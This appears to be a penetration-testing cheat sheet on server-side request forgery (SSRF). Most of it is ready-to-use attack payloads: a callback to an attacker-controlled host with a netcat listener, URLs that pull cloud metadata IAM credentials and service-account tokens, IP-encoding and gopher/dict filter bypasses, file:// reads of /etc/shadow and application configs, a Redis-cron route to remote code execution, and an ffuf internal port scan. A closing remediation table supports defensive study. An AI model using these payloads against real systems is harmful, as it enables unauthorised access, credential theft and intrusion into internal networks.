# SSRF - Server-Side Request Forgery

---

## What It Is

The server makes an HTTP request **on your behalf** to a URL you control. You're not making the request - the server is. This lets you:
- Access internal services the server can reach (but you can't)
- Bypass firewalls by pivoting through the server
- Read internal metadata (cloud environments - AWS/GCP/Azure)
- Sometimes escalate to RCE via internal services

---

## Where to Look

Any parameter that takes a URL or hostname:
```
?url=
?path=
?redirect=
?fetch=
?src=
?dest=
?image=
?load=
?file=
?page=
?uri=
?callback=
```

Also look in:
- PDF/image generation features (passes URL to renderer)
- Webhooks (user supplies a URL to call)
- Import/export features (import from URL)
- "Preview" features

---

## Detection

```
# Test if the server makes outbound requests - use your Burp Collaborator or interactsh
?url=http://<your-ip>/test

# On your machine:
nc -lvnp 80
# or
python3 -m http.server 80

# If you get a hit -> SSRF confirmed
```

---

## Basic Internal Access

Once confirmed, probe internal services:

```
# Common internal targets
?url=http://127.0.0.1/
?url=http://localhost/
?url=http://127.0.0.1:8080/
?url=http://127.0.0.1:22/         # SSH banner leak
?url=http://127.0.0.1:3306/       # MySQL banner
?url=http://127.0.0.1:6379/       # Redis
?url=http://127.0.0.1:9200/       # Elasticsearch
?url=http://127.0.0.1:5000/       # Internal API

# Try common admin panels that are only on localhost
?url=http://127.0.0.1:8080/manager/html    # Tomcat manager
?url=http://127.0.0.1:4848/               # GlassFish admin
```

---

## Cloud Metadata (If Server Is in Cloud)

```
# AWS - always try this first in cloud environments
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
?url=http://169.254.169.254/latest/user-data/

# GCP
?url=http://169.254.169.254/computeMetadata/v1/
?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

---

## Bypasses (When Basic URLs Are Filtered)

```
# IP encoding variants for 127.0.0.1
http://2130706433/          # decimal
http://0x7f000001/          # hex
http://0177.0.0.1/          # octal
http://[::1]/               # IPv6 localhost
http://127.1/               # shorthand

# DNS-based bypass - register a domain that resolves to 127.0.0.1
http://localtest.me/        # resolves to 127.0.0.1
http://customer1.app.localhost.my.company.127.0.0.1.nip.io/

# Protocol variants (if only http:// is blocked)
dict://127.0.0.1:6379/      # Redis command via dict://
file:///etc/passwd           # local file read (if file:// allowed)
gopher://127.0.0.1:25/_...  # Gopher for SMTP/Redis commands

# Redirect bypass - if server follows redirects
# Host a page on your server that redirects to 127.0.0.1
# Server fetches your URL -> follows redirect -> hits internal address
```

---

## SSRF to RCE Paths

| Internal Service Reached | What You Can Do |
|---|---|
| Redis (6379) | `gopher://` to write cron job -> RCE |
| Memcached (11211) | Cache poisoning |
| Internal CI/CD (Jenkins 8080) | Execute Groovy script |
| Internal admin panel | Trigger admin actions |
| Cloud metadata | Steal IAM credentials -> escalate |

---

## File Read via file:// (If Allowed)

```
?url=file:///etc/passwd
?url=file:///etc/shadow
?url=file:///proc/self/environ
?url=file:///var/www/html/config.php
?url=file:///C:/Windows/win.ini
?url=file:///C:/inetpub/wwwroot/web.config
```

---

## Port Scanning via SSRF

```sh
# Fuzz internal ports - look for differences in response time/size/error
# Burp Intruder or ffuf:
ffuf -u "http://target.com/fetch?url=http://127.0.0.1:FUZZ/" \
  -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt \
  -fs <size-of-closed-port-response>
```

---

## Remediation

**Root cause:** The application fetches a URL supplied by the user with no restrictions on what that URL can point to - including internal infrastructure, localhost services, and cloud metadata endpoints.

| Finding | Remediation |
|---|---|
| SSRF to internal services | Implement a **server-side allowlist** of permitted domains/IPs. Reject any URL that doesn't match. Don't use a blocklist (too easy to bypass with IP encoding, redirects, etc.). |
| SSRF to cloud metadata (169.254.169.254) | Block outbound requests to `169.254.169.254` at the network/firewall level. On AWS, use **IMDSv2** (requires a PUT request first, blocking simple SSRF). |
| SSRF via URL redirect | If the server follows redirects, the allowlist must be validated after each redirect, not just on the initial URL. |
| Open redirect enabling SSRF | Fix the open redirect independently - attackers chain open redirects with SSRF allowlist bypasses. |
| Internal admin panels accessible via SSRF | Internal services should not assume they're unreachable. Require authentication on all admin panels even on localhost. |
| file:// or gopher:// schemes allowed | Restrict URL schemes to `https://` only. Explicitly blocklist `file://`, `gopher://`, `dict://`, `ftp://` at the URL parsing layer. |

**Key point for reports:** SSRF is highest impact in cloud environments where the metadata endpoint contains IAM credentials. Always test `169.254.169.254` first in any cloud-hosted app - if reachable, it's often an immediate privilege escalation to the cloud account level.
